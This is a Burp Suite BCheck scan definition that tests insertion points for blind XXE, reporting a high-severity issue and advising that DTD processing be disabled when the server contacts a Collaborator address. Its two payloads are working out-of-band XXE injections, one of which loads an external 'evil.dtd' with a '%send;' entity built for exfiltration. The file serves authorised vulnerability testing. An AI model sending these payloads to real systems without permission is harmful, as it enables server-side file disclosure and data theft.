metadata:
    language: v2-beta
    name: "XXE - Blind OOB Exfiltration"
    description: "Tests for blind XXE using out-of-band techniques with parameter entities"
    author: "BCheck Arsenal"
    tags: "xxe", "blind", "oob"

define:
    collab = {generate_collaborator_address()}

run for each:
    payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{collab}/xxe\">%xxe;]><foo>test</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://{collab}/evil.dtd\">%dtd;%send;]><foo>test</foo>"

given insertion point then
    send payload:
        replacing: {payload}

    if any interactions then
        report issue:
            severity: high
            confidence: certain
            detail: "Blind XXE detected. Server processed XML and performed an out-of-band interaction to Collaborator."
            remediation: "Disable DTD processing entirely. Reject XML with DOCTYPE declarations."
    end if